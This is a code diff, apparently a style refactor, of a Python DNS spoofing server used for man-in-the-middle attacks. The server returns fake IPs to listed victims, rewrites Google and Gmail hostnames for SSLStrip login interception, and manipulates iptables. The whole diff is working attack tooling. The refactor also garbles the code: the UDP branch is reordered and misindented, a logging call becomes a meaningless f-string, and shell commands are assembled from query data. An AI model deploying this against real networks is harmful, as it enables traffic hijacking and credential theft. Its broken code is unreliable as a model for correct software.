@@ -18,6 +18,7 @@ Author: Leonardo Nve ( leonardo.nve@gmail.com)
 '''
 
 
+
 import dns.message
 import dns.rrset
 import dns.resolver
@@ -73,9 +74,7 @@ Forward = not args.noforward
 fake_ips = []
 # List of of ips
 if args.ips is not None:
-    for ip in args.ips.split(","):
-        fake_ips.append(ip)
-
+    fake_ips.extend(iter(args.ips.split(",")))
 Resolver = dns.resolver.Resolver()
 
 ######################
@@ -84,9 +83,8 @@ Resolver = dns.resolver.Resolver()
 
 
 def save_req(lfile, str):
-    f = open(lfile, "a")
-    f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ' ' + str)
-    f.close()
+    with open(lfile, "a") as f:
+        f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ' ' + str)
 
 
 def SIGUSR1_handle(signalnum, frame):
@@ -121,59 +119,51 @@ def process_files():
     dominios.clear()
     spoof.clear()
 
-    nsfile = open(nospoof_file, 'r')
-    for line in nsfile:
-        if line[0] == '#':
-            continue
-        h = line.split()
-        if len(h) > 0:
-            DEBUGLOG('Non spoofing ' + h[0])
-            nospoof.append(h[0])
+    with open(nospoof_file, 'r') as nsfile:
+        for line in nsfile:
+            if line[0] == '#':
+                continue
+            h = line.split()
+            if len(h) > 0:
+                DEBUGLOG(f'Non spoofing {h[0]}')
+                nospoof.append(h[0])
 
-    nsfile.close()
+    with open(victim_file, 'r') as nsfile:
+        for line in nsfile:
+            if line[0] == '#':
+                continue
+            h = line.split()
+            if len(h) > 0:
+                DEBUGLOG(f'Spoofing only to {h[0]}')
+                victims.append(h[0])
 
-    nsfile = open(victim_file, 'r')
-    for line in nsfile:
-        if line[0] == '#':
-            continue
-        h = line.split()
-        if len(h) > 0:
-            DEBUGLOG('Spoofing only to ' + h[0])
-            victims.append(h[0])
+    with open(nospoofto_file, 'r') as nsfile:
+        for line in nsfile:
+            if line[0] == '#':
+                continue
+            h = line.split()
+            if len(h) > 0:
+                DEBUGLOG(f'Non spoofing to {h[0]}')
+                nospoofto.append(h[0])
 
-    nsfile.close()
+    with open(specific_file, 'r') as nsfile:
+        for line in nsfile:
+            if line[0] == '#':
+                continue
+            h = line.split()
+            if len(h) > 1:
+                DEBUGLOG(f'Specific host spoofing {h[0]} with {h[1]}')
+                spoof[h[0]] = h[1]
 
-    nsfile = open(nospoofto_file, 'r')
-    for line in nsfile:
-        if line[0] == '#':
-            continue
-        h = line.split()
-        if len(h) > 0:
-            DEBUGLOG('Non spoofing to ' + h[0])
-            nospoofto.append(h[0])
+    with open(dominios_file, 'r') as nsfile:
+        for line in nsfile:
+            if line[0] == '#':
+                continue
+            h = line.split()
+            if len(h) > 1:
+                DEBUGLOG(f'Specific domain IP {h[0]} with {h[1]}')
+                dominios[h[0]] = h[1]
 
-    nsfile.close()
-
-    nsfile = open(specific_file, 'r')
-    for line in nsfile:
-        if line[0] == '#':
-            continue
-        h = line.split()
-        if len(h) > 1:
-            DEBUGLOG('Specific host spoofing ' + h[0] + ' with ' + h[1])
-            spoof[h[0]] = h[1]
-
-    nsfile.close()
-    nsfile = open(dominios_file, 'r')
-    for line in nsfile:
-        if line[0] == '#':
-            continue
-        h = line.split()
-        if len(h) > 1:
-            DEBUGLOG('Specific domain IP ' + h[0] + ' with ' + h[1])
-            dominios[h[0]] = h[1]
-
-    nsfile.close()
     return
 
 
@@ -185,7 +175,9 @@ def DEBUGLOG(str):
 
 
 def handler_msg(id):
-    os.popen('./handler_msg.sh %s >> handler_msg.log 2>> handler_msg_error.log &'%id.replace('`','_').replace(';','_').replace('|','_').replace('&','_'))
+    os.popen(
+        f"./handler_msg.sh {id.replace('`', '_').replace(';', '_').replace('|', '_').replace('&', '_')} >> handler_msg.log 2>> handler_msg_error.log &"
+    )
     return
 
 ######################
@@ -203,11 +195,10 @@ class ThreadSniffer(threading.Thread):
 def go():
     global ip1
     global dev
-    bpffilter = "dst host %s and not src host %s and !(tcp dst port 80 or tcp dst port 443) and (not host %s)" % (
-        ip1, ip1, adminip)
+    bpffilter = f"dst host {ip1} and not src host {ip1} and !(tcp dst port 80 or tcp dst port 443) and (not host {adminip})"
     cap = pcapy.open_live(dev, 255, 1, 0)
     cap.setfilter(bpffilter)
-    DEBUGLOG( "Starting sniffing in (%s = %s)...." % (dev, ip1))
+    DEBUGLOG(f"Starting sniffing in ({dev} = {ip1})....")
 
     #start sniffing packets
     while True:
@@ -220,7 +211,6 @@ def go():
 
 #function to parse a packet
 def parse_packet(packet):
-    eth_length = 14
     eth_protocol = 8
     global ip1
     global consultas
@@ -228,6 +218,7 @@ def parse_packet(packet):
 
     #Parse IP packets, IP Protocol number = 8
     if eth_protocol == 8:
+        eth_length = 14
         #Parse IP header
         #take first 20 characters for the ip header
         ip_header = packet[eth_length:20 + eth_length]
@@ -249,7 +240,9 @@ def parse_packet(packet):
 
 
         #TCP protocol
-        if protocol == 6:
+        if protocol == 17:
+            u = iph_length + eth_length
+        elif protocol == 6:
             t = iph_length + eth_length
             tcp_header = packet[t:t + 20]
 
@@ -266,24 +259,19 @@ def parse_packet(packet):
 
 
             if consultas.has_key(str(s_addr)):
-                DEBUGLOG(' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr))
-                DEBUGLOG(' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port))
+                DEBUGLOG(
+                    f' ==> Source Address : {str(s_addr)} *  Destination Address : {str(d_addr)}'
+                )
+                DEBUGLOG(f' Source Port : {str(source_port)} *  Dest Port : {str(dest_port)}')
                 #            	print '>>>>  '+str(s_addr)+' esta en la lista!!!!.....'
-                comando = 'sh ./IPBouncer.sh %s %s %s %s' % (
-                    ip2, str(dest_port), consultas[str(s_addr)], str(dest_port))
+                comando = f'sh ./IPBouncer.sh {ip2} {str(dest_port)} {consultas[str(s_addr)]} {str(dest_port)}'
                 os.system(comando.replace(';','_').replace('|','_').replace('&','_').replace('`','_'))
                 #print '>>>> ' + comando
-                comando = '/sbin/iptables -D INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
-                    ip1, str(dest_port), str(s_addr), str(source_port))
+                comando = f'/sbin/iptables -D INPUT -p tcp -d {ip1} --dport {str(dest_port)} -s {str(s_addr)} --sport {str(source_port)} --j REJECT --reject-with tcp-reset'
                 os.system(comando.replace(';','_').replace('|','_').replace('&','_').replace('`','_'))
-                comando = '/sbin/iptables -A INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
-                    ip1, str(dest_port), str(s_addr), str(source_port))
+                comando = f'/sbin/iptables -A INPUT -p tcp -d {ip1} --dport {str(dest_port)} -s {str(s_addr)} --sport {str(source_port)} --j REJECT --reject-with tcp-reset'
                 os.system(comando.replace(';','_').replace('|','_').replace('&','_').replace('`','_'))
-                #print '>>>> ' + comando
-
-        #UDP packets
-        elif protocol == 17:
-            u = iph_length + eth_length
+                            #print '>>>> ' + comando
             #udph_length = 8
             #udp_header = packet[u:u + 8]
             #now unpack them :)
@@ -382,9 +370,9 @@ def requestHandler(address, message):
 
 def std_PTR_qry(msg):
     qs = msg.question
-    DEBUGLOG( str(len(qs)) + ' questions.')
+    DEBUGLOG(f'{len(qs)} questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
+    DEBUGLOG(f'Host: {iparpa}')
     resp = make_response(qry=msg)
     hosts = respuestas(iparpa[:-1], 'PTR')
     if isinstance(hosts, numbers.Integral):
@@ -393,7 +381,7 @@ def std_PTR_qry(msg):
         return resp
 
     for host in hosts:
-        DEBUGLOG('Adding ' + host.to_text())
+        DEBUGLOG(f'Adding {host.to_text()}')
         rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
         resp.answer.append(rrset)
 
@@ -402,25 +390,10 @@ def std_PTR_qry(msg):
 
 def std_MX_qry(msg):
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    DEBUGLOG(f'{len(qs)} questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
-    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
-    return resp
-    #Temporal disable MX responses
-    resp = make_response(qry=msg)
-    hosts = respuestas(iparpa[:-1], 'MX')
-    if isinstance(hosts, numbers.Integral):
-        DEBUGLOG('No host....')
-        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
-        return resp
-
-    for host in hosts:
-        DEBUGLOG('Adding ' + host.to_text())
-        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
-        resp.answer.append(rrset)
-
-    return resp
+    DEBUGLOG(f'Host: {iparpa}')
+    return make_response(qry=msg, RCODE=3)
 
 
 def std_TXT_qry(msg):
@@ -501,8 +474,7 @@ def std_SPF_qry(msg):
     return resp
 
 def std_AAAA_qry(msg):
-    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
-    return resp
+    return make_response(qry=msg, RCODE=3)
 
 def std_A_qry(msg, prov_ip):
     global consultas
@@ -512,11 +484,11 @@ def std_A_qry(msg, prov_ip):
 
     dosleep = False
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    DEBUGLOG(f'{len(qs)} questions.')
     resp = make_response(qry=msg)
     for q in qs:
         qname = q.name.to_text()[:-1]
-        DEBUGLOG('q name = ' + qname)
+        DEBUGLOG(f'q name = {qname}')
 
         host = qname.lower()
 
@@ -545,26 +517,26 @@ def std_A_qry(msg, prov_ip):
             #     id = host[:punto1]
             #     dominio = dom1
 
-            DEBUGLOG('Alert domain! ID: ' + host)
+            DEBUGLOG(f'Alert domain! ID: {host}')
             # Here the HANDLE!
             #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
             handler_msg(host)
-            save_req(LOGALERTFILE, 'Alert domain! ID: ' + host + '\n')
-            
+            save_req(LOGALERTFILE, f'Alert domain! ID: {host}' + '\n')
+
             if host not in spoof:
-                DEBUGLOG('Responding with IP = ' + dominios[find_host])
+                DEBUGLOG(f'Responding with IP = {dominios[find_host]}')
                 rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[find_host])
             else:
-                DEBUGLOG('Responding with IP = ' + spoof[host])
+                DEBUGLOG(f'Responding with IP = {spoof[host]}')
                 rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, spoof[host])
 
             resp.answer.append(rrset)
             return resp, dosleep
 
-        if ".%s"%host in dominios:
-            dominio = ".%s"%host
+        if f".{host}" in dominios:
+            dominio = f".{host}"
             ttl = 1
-            DEBUGLOG('Responding with IP = ' + dominios[dominio])
+            DEBUGLOG(f'Responding with IP = {dominios[dominio]}')
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
             resp.answer.append(rrset)
             return resp, dosleep
@@ -576,17 +548,17 @@ def std_A_qry(msg, prov_ip):
             dominio = host[punto:]
             host2 = ''
             if host[:5] == 'wwww.' or host[:7] == 'social.':
-                host2 = 'www%s' % dominio
+                host2 = f'www{dominio}'
             elif host[:3] == 'web':
                 host2 = host[3:]
             elif host[:7] == 'cuentas':
-                host2 = 'accounts%s' % dominio
+                host2 = f'accounts{dominio}'
             elif host[:5] == 'gmail':
-                host2 = 'mail%s' % dominio
+                host2 = f'mail{dominio}'
             elif host == 'chatenabled.gmail.google.com':  # Yes, It is ugly....
                 host2 = 'chatenabled.mail.google.com'
             if host2 != '':
-                DEBUGLOG('SSLStrip transforming host: %s => %s ...' % (host, host2))
+                DEBUGLOG(f'SSLStrip transforming host: {host} => {host2} ...')
                 ips = respuestas(host2, 'A')
 
         #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
@@ -602,9 +574,9 @@ def std_A_qry(msg, prov_ip):
         ttl = 1
         if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims) == 0 or prov_ip in victims):
             if host in spoof:
-                save_req(LOGREQFILE, '!!! Specific host (' + host + ') asked....\n')
+                save_req(LOGREQFILE, f'!!! Specific host ({host}' + ') asked....\n')
                 for spoof_ip in spoof[host].split(","):
-                    DEBUGLOG('Adding fake IP = ' + spoof_ip)
+                    DEBUGLOG(f'Adding fake IP = {spoof_ip}')
                     rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof_ip)
                     resp.answer.append(rrset)
                 return resp, dosleep
@@ -613,18 +585,18 @@ def std_A_qry(msg, prov_ip):
                 #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                 if ip1 is not None:
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip1)
-                    DEBUGLOG('Adding fake IP = ' + ip1)
+                    DEBUGLOG(f'Adding fake IP = {ip1}')
                     resp.answer.append(rrset)
                 if ip2 is not None:
                     #Sleep only when using global resquest matrix
                     dosleep = True
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip2)
-                    DEBUGLOG('Adding fake IP = ' + ip2)
+                    DEBUGLOG(f'Adding fake IP = {ip2}')
                     resp.answer.append(rrset)
                 if len(fake_ips)>0:
                     for fip in fake_ips:
                         rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
-                        DEBUGLOG('Adding fake IP = ' + fip)
+                        DEBUGLOG(f'Adding fake IP = {fip}')
                         resp.answer.append(rrset)
 
         if not Forward and prov_ip not in nospoofto:
@@ -635,12 +607,12 @@ def std_A_qry(msg, prov_ip):
                 DEBUGLOG('No forwarding (but adding fake IPs)...')
                 for fip in fake_ips:
                     rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
-                    DEBUGLOG('Adding fake IP = ' + fip)
+                    DEBUGLOG(f'Adding fake IP = {fip}')
                     resp.answer.append(rrset)
             return resp, dosleep
 
         for realip in ips:
-            DEBUGLOG('Adding real IP  = ' + realip.to_text())
+            DEBUGLOG(f'Adding real IP  = {realip.to_text()}')
             rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, realip.to_text())
             resp.answer.append(rrset)
 
@@ -660,14 +632,14 @@ def std_A_qry(msg, prov_ip):
 def std_ASPOOF_qry(msg):
     global spoof
     qs = msg.question
-    DEBUGLOG(str(len(qs)) + ' questions.')
+    DEBUGLOG(f'{len(qs)} questions.')
     iparpa = qs[0].to_text().split(' ', 1)[0]
-    DEBUGLOG('Host: ' + iparpa)
+    DEBUGLOG(f'Host: {iparpa}')
     resp = make_response(qry=msg)
 
     for q in qs:
         qname = q.name.to_text()[:-1]
-        DEBUGLOG('q name = ' + qname) + ' to resolve ' + spoof[qname]
+        f"{DEBUGLOG(f'q name = {qname}')} to resolve {spoof[qname]}"
         # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
         # 		resp.answer.append(rrset)
         # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
